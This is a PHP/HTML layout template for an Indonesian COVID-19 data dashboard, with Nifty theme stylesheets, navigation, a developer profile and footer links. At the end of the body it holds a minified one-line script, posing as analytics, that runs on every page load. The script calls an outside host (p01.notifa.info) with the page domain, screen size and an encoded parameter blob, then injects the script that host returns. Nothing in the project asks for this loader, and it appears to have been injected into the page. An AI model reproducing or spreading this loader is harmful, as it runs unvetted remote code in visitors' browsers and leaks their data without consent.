<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title><?= $title ?></title>
    <link href='<?php echo base_url('assets');?>/covid19byvebriicon.png' rel='shortcut icon' type='image/x-icon' />

    <!--STYLESHEET-->
    <!--=================================================-->

    <!--Open Sans Font [ OPTIONAL ]-->
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700' rel='stylesheet' type='text/css'>


    <!--Bootstrap Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url('assets');?>/css/bootstrap.min.css" rel="stylesheet">


    <!--Nifty Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url('assets');?>/css/nifty.min.css" rel="stylesheet">


    <!--Nifty Premium Icon [ DEMONSTRATION ]-->
    <link href="<?php echo base_url('assets');?>/css/demo/nifty-demo-icons.min.css" rel="stylesheet">


    <!--=================================================-->



    <!--Pace - Page Load Progress Par [OPTIONAL]-->
    <link href="<?php echo base_url('assets');?>/plugins/pace/pace.min.css" rel="stylesheet">
    <script src="<?php echo base_url('assets');?>/plugins/pace/pace.min.js"></script>

    <!--CSS Loaders [ OPTIONAL ]-->
    <link href="<?php echo base_url('assets');?>/plugins/css-loaders/css/css-loaders.css" rel="stylesheet">

    <!--FooTable [ OPTIONAL ]-->
    <link href="<?php echo base_url('assets');?>/plugins/fooTable/css/footable.core.css" rel="stylesheet">

    <!--Morris.js [ OPTIONAL ]-->
    <link href="<?php echo base_url('assets');?>/plugins/morris-js/morris.min.css" rel="stylesheet">

    <!--Ion Icons [ OPTIONAL ]-->
    <link href="<?php echo base_url('assets');?>/plugins/flag-icon-css/css/flag-icon.min.css" rel="stylesheet">

    <!--Themify Icons [ OPTIONAL ]-->
   <link href="<?php echo base_url('assets');?>/plugins/themify-icons/themify-icons.min.css" rel="stylesheet">

   <!--Ion Icons [ OPTIONAL ]-->
    <link href="<?php echo base_url('assets');?>/plugins/ionicons/css/ionicons.min.css" rel="stylesheet">

    <!--=================================================

    REQUIRED
    You must include this in your project.


    RECOMMENDED
    This category must be included but you may modify which plugins or components which should be included in your project.


    OPTIONAL
    Optional plugins. You may choose whether to include it in your project or not.


    DEMONSTRATION
    This is to be removed, used for demonstration purposes only. This category must not be included in your project.


    SAMPLE
    Some script samples which explain how to initialize plugins or components. This category should not be included in your project.


    Detailed information and more samples can be found in the document.

    =================================================-->

</head>
<div class="preloader">
  <div class="loading">
    <div class="load7">
        <div class="loader"></div>
    </div>
    <p>Harap Tunggu</p>
  </div>
</div>
<!--TIPS-->
<!--You may remove all ID or Class names which contain "demo-", they are only used for demonstration. -->
<body>
    <div id="container" class="effect aside-float aside-bright mainnav-lg">

        <!--NAVBAR-->
        <!--===================================================-->
        <header id="navbar">
            <div id="navbar-container" class="boxed">

                <!--Brand logo & name-->
                <!--================================-->
                <div class="navbar-header">
                    <a href="index.html" class="navbar-brand">
                        <img src="<?php echo base_url('assets');?>/covid19byvebriicon.png" alt="Nifty Logo" class="brand-icon">
                        <div class="brand-title">
                            <span class="brand-text">COVID-19</span>
                        </div>
                    </a>
                </div>
                <!--================================-->
                <!--End brand logo & name-->


                <!--Navbar Dropdown-->
                <!--================================-->
                <div class="navbar-content">
                    <ul class="nav navbar-top-links">

                        <!--Navigation toogle button-->
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <li class="tgl-menu-btn">
                            <a class="mainnav-toggle" href="#">
                                <i class="demo-pli-list-view"></i>
                            </a>
                        </li>
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <!--End Navigation toogle button-->


                    </ul>
                    <ul class="nav navbar-top-links">
                    </ul>
                </div>
                <!--================================-->
                <!--End Navbar Dropdown-->

            </div>
        </header>
        <!--===================================================-->
        <!--END NAVBAR-->

        <div class="boxed">

            <!--CONTENT CONTAINER-->
            <!--===================================================-->
            <div id="content-container">
                <div id="page-head">

                <div class="pad-all text-center">
                    <h3>Perkembangan Covid 19
                      <?php if($this->uri->segment('1') == 'Covid19byvebriGLOBAL'){ ?>
                      Global
                    <?php } else{ ?>
                    Di indonesia
                    <?php } ?>
                    </h3>
                    <p1>Akses Real Time Data COVID-19 Indonesia dan Global.</p1>
                </div>
                    </div>


                <!--Page content-->
                <!--===================================================-->
                <div id="page-content">
                  <div class="alert alert-success">
                      <button class="close" data-dismiss="alert"><i class="pci-cross pci-circle"></i></button>
                      <p class="text-center">Semoga Pasien yang terjangkit di Beri Kesehatan dan Keselamatan, Bagi Yang Sudah Meninggal Semoga di Terima di Sisih Nya Aamiin.</p> <br>
                      <p class="text-center">Dan Semoga Wabah Covid-19 Cepat Mereda Sebelum Bulan Suci Ramadhan Aamiin</p>
                  </div>

                  <div class="alert alert-warning">
                      <button class="close" data-dismiss="alert"><i class="pci-cross pci-circle"></i></button>
                      <p class="text-center">Data Resmi https://kawalcorona.com/</p>
                  </div>
					    <?php echo $contents ;?>

                </div>
                <!--===================================================-->
                <!--End page content-->

            </div>
            <!--===================================================-->
            <!--END CONTENT CONTAINER-->


            <!--MAIN NAVIGATION-->
            <!--===================================================-->
            <nav id="mainnav-container">
                <div id="mainnav">
                    <!--Menu-->
                    <!--================================-->
                    <div id="mainnav-menu-wrap">
                        <div class="nano">
                            <div class="nano-content">

                                <!--Profile Widget-->
                                <!--================================-->
                                <div id="mainnav-profile" class="mainnav-profile">
                                    <div class="profile-wrap text-center">
                                        <div class="pad-btm">
                                            <img class="img-circle img-md" src="<?php echo base_url('assets');?>/akuvebri.png" alt="Profile Picture">
                                        </div>
                                        <a href="#profile-nav" class="box-block" data-toggle="collapse" aria-expanded="false">
                                            <span class="pull-right dropdown-toggle">
                                                <i class="dropdown-caret"></i>
                                            </span>
                                            <p class="mnp-name">Vebri Developer</p>
                                            <span class="mnp-desc">vebripradanamva@gmail.com</span>
                                        </a>
                                    </div>
                                    <div id="profile-nav" class="collapse list-group bg-trans">
                                        <a href="#" class="list-group-item">
                                            <i class="demo-pli-male icon-lg icon-fw"></i> View Profile
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <i class="demo-pli-gear icon-lg icon-fw"></i> Settings
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <i class="demo-pli-information icon-lg icon-fw"></i> Help
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <i class="demo-pli-unlock icon-lg icon-fw"></i> Logout
                                        </a>
                                    </div>
                                </div>


                      <ul id="mainnav-menu" class="list-group">
                          <?php require_once('_sidebarcovid.php') ; ?>
						         </ul>

                            </div>
                        </div>
                    </div>
                    <!--================================-->
                    <!--End menu-->

                </div>
            </nav>
            <!--===================================================-->
            <!--END MAIN NAVIGATION-->

        </div>



        <!-- FOOTER -->
        <!--===================================================-->
        <footer id="footer">

            <!-- Visible when footer positions are fixed -->
            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
            <div class="show-fixed pad-rgt pull-right">
                You have <a href="#" class="text-main"><span class="badge badge-danger">3</span> pending action.</a>
            </div>



            <!-- Visible when footer positions are static -->
            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
            <div class="hide-fixed pull-right pad-rgt">
              <a href="https://www.instagram.com/vebritok_blo" target="_blank">Vebri Yusdi Putra Pradana <b>Follow Me!</b></a>
            </div>



            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
            <!-- Remove the class "show-fixed" and "hide-fixed" to make the content always appears. -->
            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->

            <p class="pad-lft">&#0169; 2020 Pradana Industries <a href="https://www.instagram.com/pradanaindustries" target="_blank"><b>Follow Me!</b></a></p>



        </footer>
        <!--===================================================-->
        <!-- END FOOTER -->


        <!-- SCROLL PAGE BUTTON -->
        <!--===================================================-->
        <button class="scroll-top btn">
            <i class="pci-chevron chevron-up"></i>
        </button>
        <!--===================================================-->
    </div>
    <!--===================================================-->
    <!-- END OF CONTAINER -->





    <!--JAVASCRIPT-->
    <!--=================================================-->

    <!--jQuery [ REQUIRED ]-->
    <script src="<?php echo base_url('assets');?>/js/jquery.min.js"></script>


    <!--BootstrapJS [ RECOMMENDED ]-->
    <script src="<?php echo base_url('assets');?>/js/bootstrap.min.js"></script>


    <!--NiftyJS [ RECOMMENDED ]-->
    <script src="<?php echo base_url('assets');?>/js/nifty.min.js"></script>




    <!--=================================================-->
    <!--FooTable [ OPTIONAL ]-->
    <script src="<?php echo base_url('assets');?>/plugins/fooTable/dist/footable.all.min.js"></script>

    <!--Sparkline [ OPTIONAL ]-->
    <script src="<?php echo base_url('assets');?>/plugins/sparkline/jquery.sparkline.min.js"></script>

    <!--Easy Pie Chart [ OPTIONAL ]-->
    <script src="<?php echo base_url('assets');?>/plugins/easy-pie-chart/jquery.easypiechart.min.js"></script>

    <!--Specify page [ SAMPLE ]-->
    <script src="<?php echo base_url('assets');?>/js/demo/dashboard.js"></script>

    <!--Icons [ SAMPLE ]-->
    <script src="<?php echo base_url('assets');?>/js/demo/icons.js"></script>

    <style type="text/css">
    .preloader {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 9999;
      background-color: #fff;
    }
    .preloader .loading {
      position: absolute;
      left: 50%;
      top: 50%;
      transform: translate(-50%,-50%);
      font: 14px arial;
    }
    </style>

    <script>
        $(document).ready(function(){
          $(".preloader").fadeOut();
        })
        </script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2CNaLknYAoSAvs98oacbv6DvMT%2f%2bY5LXMhffm4NwPkWsBjhVYydA5TgexA5TPuehJcf1rofsTxUshKgS6JGNbcp094lptdV%2faEEvmPBGT%2f%2bIUz8fPFAYVv1kyrePfLnn1OIfND64krcAPqYoRw9tD4jYuQc2I2CQdA43NL%2fz%2fgmSNsHp04Lxd9Zejir9TpvEeP6jajSbHKOwzztx84mRbvJ2WSeZLg6X3uDywp%2f9VMTLnTbijBZSQATZp7JFw69O%2b9miydF4%2ftpF1iSAlQ8cDhTq9Evag%2bbjXgK8x8W0oRTVSNKbgUsZ6PXKuaOcBD5wknwERS0uyfNvDliFbbvVG6reDMOEB5T6kw5vnX%2b3YnmxR3UyKwJcz0cPHteHN0gj28enWF0bPLTUbRdPr%2bJ2LDgjrM%2fFqOf7pVnse7V3lJUoRQ8alqU1dgfCQQv07ndsn2wiLGCto01k%2bzo5%2btBsCZzsY%2bLzIRBbdPD3d%2fAL1xBo%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<script type="text/javascript">
// Filtering
    // -----------------------------------------------------------------
    var filtering = $('#demo-foo-filtering');
    filtering.footable().on('footable_filtering', function (e) {
        var selected = $('#demo-foo-filter-status').find(':selected').val();
        e.filter += (e.filter && e.filter.length > 0) ? ' ' + selected : selected;
        e.clear = !e.filter;
    });

    // Filter status
    $('#demo-foo-filter-status').change(function (e) {
        e.preventDefault();
        filtering.trigger('footable_filter', {filter: $(this).val()});
    });

    // Search input
    $('#demo-foo-search').on('input', function (e) {
        e.preventDefault();
        filtering.trigger('footable_filter', {filter: $(this).val()});
    });
    </script>
</html>
